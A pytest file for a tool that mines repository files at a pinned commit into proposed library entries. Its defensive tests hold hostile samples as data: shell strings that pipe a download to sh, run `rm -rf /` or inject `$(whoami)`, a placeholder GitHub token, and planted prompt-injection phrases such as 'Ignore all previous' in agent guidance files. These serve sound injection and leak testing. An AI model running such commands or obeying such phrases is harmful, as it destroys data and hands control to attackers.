"""The library's miners: proposals from a repository's own files at a pinned commit.

Navigation
----------
What it is:   Unit tests of ``crb.core.miners`` over a real git fixture repository.
What it does: Pins each shipped miner's reading (ADRs in force → decisions; CODEOWNERS and the
              layout → components with their owners, never an email; lint and formatter
              configurations → conventions with their check; the test layout → a test
              standard per language scoped to work types; the change profile → work-type
              candidates with counts, cited by graded rows); that every proposal carries its
              file and commit and ``mined:<miner>@<version>`` and is never signed; that guidance
              files are data and no planted instruction reaches any entry; that the same sha
              proposes nothing new and a miner never replaces what a person wrote, revoked or
              adopted; that a using team adds a miner through the registry and the contract
              refuses what breaks it; and that a model's drafting is recorded as its drafter.
How:          ``tests/fixtures/miner_repo.py`` builds the repository; ``source_from_git`` pins
              it; ``run_miners`` runs; the core's ``apply`` folds proposals into states.
Layer:        tests — docs/ARCHITECTURE.md#44-outer-layers
ADRs:         docs/adr/0026-the-context-standard.md (item 10)
Works with:   src/crb/core/miners.py (under test), src/crb/core/library.py (the record and the
              fold), tests/fixtures/miner_repo.py (the repository)
Tested by:    this file
Touch when:   never for a new repository; a miner, the registry's contract or the idempotency
              rule changes.
"""

from __future__ import annotations

import hashlib
import tomllib
import uuid
from collections.abc import Iterable, Iterator, Mapping
from pathlib import Path
from typing import Any

import pytest

from crb.core.git import GitRepo
from crb.core.library import (
    ACT_PROPOSE,
    ACT_REVOKE,
    ACT_SPONSOR,
    EntryState,
    LibraryAct,
    LibraryEntry,
    Provenance,
    apply,
)
from crb.core.miners import (
    OUTCOME_FAILED,
    OUTCOME_HELD,
    OUTCOME_NOTED,
    OUTCOME_PROPOSED,
    OUTCOME_REFUSED,
    OUTCOME_UNCHANGED,
    Draft,
    Drafter,
    GradedRow,
    MinedTask,
    MineRun,
    MineSource,
    Note,
    describe_miners,
    guidance_commands,
    miner_names,
    register_miner,
    run_miners,
    source_from_git,
    unregister_miner,
)
from fixtures.miner_repo import INJECTIONS, MinerRepo, commit, make_miner_repo

REPO = "acme"


@pytest.fixture
def fx(tmp_path: Path) -> MinerRepo:
    return make_miner_repo(tmp_path / "acme")


def _source(fx: MinerRepo, ref: str = "HEAD", **kw: Any) -> MineSource:
    return source_from_git(GitRepo(fx.path), REPO, ref, **kw)


def _by_id(run: MineRun) -> dict[str, LibraryEntry]:
    return {p.entry.entry_id: p.entry for p in run.proposals}


def _act(entry_id: str, version: str, act: str, actor: str, body: Mapping[str, Any]) -> LibraryAct:
    return LibraryAct(
        act_id=uuid.uuid4().hex,
        repo=REPO,
        entry_id=entry_id,
        version=version,
        act=act,
        actor=actor,
        created="2026-09-28T00:00:00+00:00",
        body=dict(body),
    )


def _fold(run: MineRun, states: dict[str, EntryState] | None = None) -> dict[str, EntryState]:
    """Append every proposal of ``run`` as the store would (the core's rule applied)."""
    out = dict(states or {})
    for p in run.proposals:
        e = p.entry
        out[e.entry_id] = apply(
            out.get(e.entry_id),
            _act(e.entry_id, e.version, ACT_PROPOSE, e.proposed_by, {"entry": e.content()}),
        )
    return out


def _blob_digest(fx: MinerRepo, sha: str, path: str) -> str:
    data = GitRepo(fx.path).show_blob(sha, path)
    assert data is not None
    return hashlib.sha256(data).hexdigest()


# ---------------------------------------------------------------------------
# The source is pinned
# ---------------------------------------------------------------------------


def test_the_source_is_pinned_to_the_full_sha_the_ref_names_now(fx: MinerRepo) -> None:
    src = _source(fx, "main")
    assert src.commit == fx.sha and len(src.commit) == 40
    assert "docs/adr/0001-use-go-modules.md" in src.files
    with pytest.raises(ValueError, match="pinned to one commit"):
        MineSource(REPO, fx.sha[:12], src.files, lambda _p: b"")


# ---------------------------------------------------------------------------
# The five shipped miners
# ---------------------------------------------------------------------------


def test_adrs_in_force_become_decisions_citing_their_file_and_commit(fx: MinerRepo) -> None:
    run = run_miners(_source(fx), names=["adrs"])
    got = _by_id(run)
    assert sorted(got) == [
        "decision/adr-0001-use-go-modules-for-every-command",
        "decision/adr-0002-errors-are-wrapped-with-their-operation",
    ]
    first = got["decision/adr-0001-use-go-modules-for-every-command"]
    assert first.statement.startswith("ADR 0001 (accepted): Every command under `cmd/cli`")
    assert first.components == ("cmd-cli", "internal-store")
    prov = first.provenance
    assert (prov.kind, prov.path, prov.commit) == (
        "file",
        "docs/adr/0001-use-go-modules.md",
        fx.sha,
    )
    assert prov.digest == _blob_digest(fx, fx.sha, prov.path)
    assert first.proposed_by == "mined:adrs@1"
    second = got["decision/adr-0002-errors-are-wrapped-with-their-operation"]
    assert "wrap every returned error with fmt.Errorf" in second.statement
    noted = {o.subject: o.reason for o in run.outcomes if o.outcome == OUTCOME_NOTED}
    assert noted == {"docs/adr/0003-global-logger.md": "not in force: its status is superseded"}


def test_codeowners_and_the_layout_become_components_with_their_owners(fx: MinerRepo) -> None:
    run = run_miners(_source(fx), names=["owners"])
    got = _by_id(run)
    # every part the layout names; ``*`` in CODEOWNERS covers even ``tools``, which has no
    # manifest of its own
    assert sorted(got) == [
        "component/cmd-cli",
        "component/internal-store",
        "component/tools",
        "component/web",
    ]
    cli = got["component/cmd-cli"]
    assert "Owners: @acme/cli-team, @jdoe, per .github/CODEOWNERS." in cli.statement
    assert cli.provenance.path == ".github/CODEOWNERS"
    store = got["component/internal-store"]
    assert "1 email address" in store.statement
    assert "example.com" not in store.statement  # an email is counted, never copied
    assert got["component/web"].statement.endswith(
        "Owners: @acme/maintainers, per .github/CODEOWNERS."
    )


def test_without_codeowners_a_part_cites_its_manifest_or_is_noted(tmp_path: Path) -> None:
    fx = make_miner_repo(
        tmp_path / "bare",
        {"web/README.md": "# web\n", "web/app.py": "", "tools/gen.sh": "", "go.mod": "module x\n"},
    )
    run = run_miners(_source(fx), names=["owners"])
    web = _by_id(run)["component/web"]
    assert web.provenance.path == "web/README.md"
    assert web.statement.endswith("The repository has no CODEOWNERS file.")
    noted = [(o.subject, o.counts) for o in run.outcomes if o.outcome == OUTCOME_NOTED]
    assert noted == [("tools", {"files": 1})]


def test_lint_configurations_become_conventions_with_the_check_that_runs_them(
    fx: MinerRepo,
) -> None:
    got = _by_id(run_miners(_source(fx), names=["lint"]))
    ruff = got["convention/ruff"]
    assert (ruff.check, ruff.characteristic) == ("repo_lint_clean", "Maintainability")
    assert ruff.provenance.path == "pyproject.toml" and "`ruff check`" in ruff.statement
    assert got["convention/ruff-format"].check == "repo_lint_clean"
    assert got["convention/gofmt"].statement.startswith("The repository is a Go module (go.mod")
    # a tool crb does not run names no check: it is advisory, never counted as evidence
    golangci = got["convention/golangci-lint"]
    assert golangci.check == "" and golangci.provenance.path == ".golangci.yml"
    assert "advisory" in golangci.statement
    assert got["convention/mypy"].check == ""


def test_the_test_layout_becomes_a_test_standard_scoped_to_its_work_types(fx: MinerRepo) -> None:
    tasks = [
        MinedTask("a" * 40, "bug.fix", "S", ("web/app.py",), ("tests/test_app.py",)),
        MinedTask("b" * 40, "bug.fix", "S", ("web/app.py",), ("tests/test_app.py",)),
        MinedTask("c" * 40, "test.add", "XS", (), ("tests/test_store.py",)),
        MinedTask(
            "d" * 40, "backend.route.add", "M", ("cmd/cli/main.go",), ("cmd/cli/root_test.go",)
        ),
    ]
    got = _by_id(run_miners(_source(fx, tasks=tasks), names=["tests"]))
    py = got["standard/tests-python"]
    assert (py.characteristic, py.check) == ("Functional suitability", "target_green")
    # the first example test is the source; the runner's configuration is named
    assert py.provenance.path == "tests/test_app.py"
    assert "run by pytest (per pyproject.toml)" in py.statement
    assert py.work_types == ("bug.fix", "test.add")
    assert "most of its python tests under tests/, named like test_*.py" in py.statement
    assert "`tests/test_app.py`, `tests/test_store.py`" in py.statement
    go = got["standard/tests-go"]
    assert go.work_types == ("backend.route.add",) and "run by go test" in go.statement


def test_the_change_profile_proposes_candidates_with_counts_cited_by_graded_rows(
    fx: MinerRepo,
) -> None:
    tasks = [
        MinedTask("1" * 40, "bug.fix", "S", ("cmd/cli/main.go",)),
        MinedTask("2" * 40, "bug.fix", "M", ("cmd/cli/root.go",)),
        MinedTask("3" * 40, "bug.fix", "S", ("internal/store/store.go",)),
        MinedTask("4" * 40, "bug.fix", "S", ("internal/store/store.go",)),
        MinedTask("5" * 40, "test.add", "XS", ("web/app.py",)),  # one commit: an instance
        MinedTask("6" * 40, "(unclassified)", "S", ("web/app.py",)),
    ]
    rows = [
        GradedRow("e" * 64, "1" * 40, True),
        GradedRow("f" * 64, "2" * 40, False),
    ]
    run = run_miners(_source(fx, tasks=tasks, graded=rows), names=["change-profile"])
    [wt] = run.proposals
    e = wt.entry
    assert e.entry_id == "work-type/bug-fix-in-cmd-cli"
    assert (e.parent_class, e.examples) == ("bug.fix", ("1" * 40, "2" * 40))
    assert e.provenance.kind == "rows" and e.provenance.rows == ("e" * 64, "f" * 64)
    assert "2 mined commits of bug.fix change cmd/cli/ (sizes S 1, M 1)" in e.statement
    assert "2 graded rows, 1 clean" in e.statement
    [noted] = [o for o in run.outcomes if o.outcome == OUTCOME_NOTED]
    assert noted.subject == "work-type/bug-fix-in-internal-store"
    assert "replay these commits" in noted.reason
    assert dict(noted.counts) == {"commits": 2, "graded_rows": 0, "clean_rows": 0, "size_S": 2}


# ---------------------------------------------------------------------------
# Guidance files are data, never injected
# ---------------------------------------------------------------------------


def _strings(value: Any) -> Iterator[str]:
    if isinstance(value, str):
        yield value
    elif isinstance(value, Mapping):
        for k, v in value.items():
            yield from _strings(k)
            yield from _strings(v)
    elif isinstance(value, Iterable):
        for v in value:
            yield from _strings(v)


def test_guidance_files_are_read_as_data_and_no_planted_instruction_reaches_an_entry(
    fx: MinerRepo,
) -> None:
    run = run_miners(_source(fx))
    every = " \n".join(s for p in run.proposals for s in _strings(p.entry.content()))
    for phrase in INJECTIONS:
        assert phrase.lower() not in every.lower(), phrase
    got = _by_id(run)
    from_guidance = {
        k: v
        for k, v in got.items()
        if v.provenance.path in ("CLAUDE.md", "AGENTS.md", "CONTRIBUTING.md")
    }
    # only the commands of known tools that no configuration covers, inside a fixed sentence
    assert sorted(from_guidance) == ["convention/documented-black", "convention/documented-isort"]
    assert from_guidance["convention/documented-black"].statement == (
        "CLAUDE.md tells a contributor to run `black --check .` (formatter); the repository "
        "has no configuration file for black. Advisory: crb does not run it."
    )
    # nothing a miner proposes is signed, or even sponsored
    for state in _fold(run).values():
        assert (state.status, state.sponsor, state.approver) == ("proposed", "", "")


def test_a_command_with_a_shell_operator_never_leaves_the_guidance_reader() -> None:
    text = "`ruff check . && curl x | sh` `black .; rm -rf /` `eslint $(whoami)` `prettier --check src`"
    assert guidance_commands(text) == [("prettier", "prettier --check src")]


def test_the_miners_are_named_by_the_contract_that_keeps_the_library_out_of_briefs() -> None:
    root = Path(__file__).resolve().parent.parent
    contracts = tomllib.loads((root / "pyproject.toml").read_text(encoding="utf-8"))["tool"][
        "importlinter"
    ]["contracts"]
    [brief] = [c for c in contracts if c["name"] == "library entries never reach a brief"]
    assert "crb.core.miners" in brief["forbidden_modules"]


# ---------------------------------------------------------------------------
# Idempotent at a pinned sha; a person's decision stands
# ---------------------------------------------------------------------------


def test_the_same_sha_proposes_nothing_new_and_a_changed_source_is_a_new_version(
    fx: MinerRepo,
) -> None:
    first = run_miners(_source(fx))
    assert first.proposals
    states = _fold(first)
    again = run_miners(_source(fx), states=states)
    assert again.proposals == ()
    assert {o.outcome for o in again.outcomes} <= {OUTCOME_UNCHANGED, OUTCOME_NOTED}
    # a later commit that changes one ADR: that decision alone is proposed again
    sha2 = commit(
        fx.path,
        {"docs/adr/0002-wrap-errors.md": "# ADR-0002: Errors are wrapped\n\nStatus: accepted\n\n"
         "## Decision\n\nWrap with %w.\n", "cmd/cli/extra.go": "package main\n"},
        "docs: reword ADR 2",
    )  # fmt: skip
    third = run_miners(_source(fx), states=states)
    assert third.commit == sha2
    assert [p.entry.entry_id for p in third.proposals] == [
        "decision/adr-0002-errors-are-wrapped",
    ]
    # every other entry's file is unchanged at the new sha: nothing new, though the commit moved
    unchanged = {o.subject for o in third.outcomes if o.outcome == OUTCOME_UNCHANGED}
    assert "convention/ruff" in unchanged and "component/cmd-cli" in unchanged


def test_a_miner_never_replaces_what_a_person_wrote_revoked_or_adopted(fx: MinerRepo) -> None:
    states = _fold(run_miners(_source(fx), names=["lint"]))
    # a person adopts the ruff convention; a newer miner version rewording it is held back
    ruff = states["convention/ruff"]
    states["convention/ruff"] = apply(
        ruff, _act(ruff.entry_id, ruff.entry.version, ACT_SPONSOR, "user-op1", {})
    )
    # a person revokes the mypy convention
    mypy = states["convention/mypy"]
    states["convention/mypy"] = apply(
        mypy, _act(mypy.entry_id, mypy.entry.version, ACT_REVOKE, "user-appr1", {"reason": "no"})
    )
    # a person wrote their own gofmt convention
    own = LibraryEntry(
        repo=REPO, kind="convention", slug="gofmt", title="Go code is gofmt'd",
        statement="Run gofmt.", provenance=Provenance(kind="person", person="user-op1"),
        proposed_by="user-op1",
    )  # fmt: skip
    states["convention/gofmt"] = apply(
        None, _act(own.entry_id, own.version, ACT_PROPOSE, "user-op1", {"entry": own.content()})
    )
    run = run_miners(_source(fx), names=["lint"], states=states)
    outcome = {o.subject: (o.outcome, o.reason) for o in run.outcomes}
    assert outcome["convention/ruff"][0] == OUTCOME_UNCHANGED
    assert outcome["convention/mypy"] == (
        OUTCOME_HELD,
        "a person revoked this entry; only a person proposes it again",
    )
    assert outcome["convention/gofmt"] == (
        OUTCOME_HELD,
        "a person wrote this entry; a miner never replaces it",
    )
    assert run.proposals == ()


# ---------------------------------------------------------------------------
# The registry: a using team adds a miner, and the contract holds it
# ---------------------------------------------------------------------------


class _TeamMiner:
    """A using team's miner: every Makefile target named ``check`` as a convention — and,
    to exercise the contract, drafts it must not propose."""

    name = "team-make"
    version = "3"
    kinds: tuple[str, ...] = ("convention",)
    reads = "the Makefile's check target"

    def mine(self, source: MineSource) -> Iterator[Draft | Note]:
        yield Draft(
            "convention", "make-check", "make check passes", "`make check` passes.", path="go.mod"
        )
        yield Draft("decision", "not-mine", "A decision", "Not declared.", path="go.mod")
        yield Draft(
            "convention", "ghost", "A ghost", "Cites a file the commit lacks.", path="nope.txt"
        )
        yield Draft("convention", "both", "Both", "Two sources.", path="go.mod", rows=("e" * 64,))
        yield Draft(
            "convention", "leak", "A leak", "token ghp_" + "a" * 36 + " is ours.", path="go.mod"
        )
        yield Draft("convention", "ruff", "Dup", "Another miner proposed it first.", path="go.mod")
        yield Note("Makefile", "no Makefile at the commit")


class _Broken:
    name = "broken"
    version = "1"
    kinds: tuple[str, ...] = ("component",)
    reads = "nothing"

    def mine(self, source: MineSource) -> Iterable[Draft | Note]:
        raise RuntimeError("this miner fell over")


@pytest.fixture
def team() -> Iterator[None]:
    register_miner(_TeamMiner())
    register_miner(_Broken())
    try:
        yield
    finally:
        unregister_miner("team-make")
        unregister_miner("broken")


def test_a_using_team_adds_a_miner_through_the_registry_and_the_contract_holds_it(
    fx: MinerRepo, team: None
) -> None:
    assert miner_names()[-2:] == ("team-make", "broken")
    assert {"name": "team-make", "version": "3", "proposer": "mined:team-make@3",
            "kinds": ["convention"], "reads": "the Makefile's check target"} in describe_miners()  # fmt: skip
    run = run_miners(_source(fx), names=["lint", "team-make", "broken"])
    assert run.miners == ("lint@1", "team-make@3", "broken@1")
    team_out = {o.subject: (o.outcome, o.reason) for o in run.outcomes if o.miner == "team-make@3"}
    assert team_out["convention/make-check"][0] == OUTCOME_PROPOSED
    made = _by_id(run)["convention/make-check"]
    # the runner, not the miner, stamps the proposer and the provenance
    assert made.proposed_by == "mined:team-make@3"
    assert (made.provenance.path, made.provenance.commit) == ("go.mod", fx.sha)
    assert team_out["decision/not-mine"] == (
        OUTCOME_REFUSED,
        "the miner declared ('convention',), not decision",
    )
    assert team_out["convention/ghost"][0] == OUTCOME_REFUSED
    assert "not a file of the repository at the commit" in team_out["convention/ghost"][1]
    assert team_out["convention/both"][0] == OUTCOME_REFUSED
    assert team_out["convention/leak"][0] == OUTCOME_REFUSED
    assert "ghp_" not in team_out["convention/leak"][1]
    assert team_out["convention/ruff"] == (OUTCOME_REFUSED, "another miner proposed it first")
    assert team_out["Makefile"] == (OUTCOME_NOTED, "no Makefile at the commit")
    [failed] = [o for o in run.outcomes if o.outcome == OUTCOME_FAILED]
    assert (failed.miner, failed.reason) == ("broken@1", "this miner fell over")


def test_the_registry_refuses_a_miner_that_breaks_the_contract(team: None) -> None:
    class Nameless(_TeamMiner):
        name = "Not A Slug"

    class Unversioned(_TeamMiner):
        name = "unversioned"
        version = "v2"

    class Kindless(_TeamMiner):
        name = "kindless"
        kinds = ("gossip",)

    for bad, match in (
        (Nameless(), "slug"),
        (Unversioned(), "whole number"),
        (Kindless(), "one or more"),
    ):
        with pytest.raises(ValueError, match=match):
            register_miner(bad)
    with pytest.raises(ValueError, match="already registered"):
        register_miner(_TeamMiner())
    with pytest.raises(TypeError):
        register_miner(object())  # type: ignore[arg-type]
    with pytest.raises(ValueError, match="no miner registered"):
        run_miners(MineSource(REPO, "0" * 40, (), lambda _p: None), names=["nobody"])


# ---------------------------------------------------------------------------
# A model's drafting is recorded as the drafter
# ---------------------------------------------------------------------------


def test_a_drafter_is_recorded_as_the_drafter_and_held_to_the_same_rules(fx: MinerRepo) -> None:
    seen: list[Draft] = []

    def reword(d: Draft) -> str:
        seen.append(d)
        return f"Reworded: {d.title}."

    run = run_miners(_source(fx), names=["lint"], drafter=Drafter("fake-model-1", reword))
    ruff = _by_id(run)["convention/ruff"]
    assert ruff.proposed_by == "drafted:fake-model-1"
    assert ruff.statement == "Reworded: Code passes ruff."
    assert ruff.provenance.path == "pyproject.toml" and ruff.provenance.commit == fx.sha
    assert {p.drafted_by for p in run.proposals} == {"fake-model-1"}
    assert {p.miner for p in run.proposals} == {"lint@1"}
    # the drafter never sees a guidance file's words: only the miner's draft
    assert all("Ignore all previous" not in d.statement for d in seen)
    # a drafted entry is unchanged at the same source, whatever the model would say next time
    again = run_miners(
        _source(fx), names=["lint"], states=_fold(run), drafter=Drafter("fake-model-1", reword)
    )
    assert again.proposals == ()
    # a draft that breaks the record's rules is not written: the miner's words stand
    long = run_miners(_source(fx), names=["lint"], drafter=Drafter("m", lambda d: "x" * 401))
    ruff2 = _by_id(long)["convention/ruff"]
    assert ruff2.proposed_by == "mined:lint@1"
    [o] = [o for o in long.outcomes if o.subject == "convention/ruff"]
    assert o.reason.startswith("the drafter failed, so the miner's words stand")
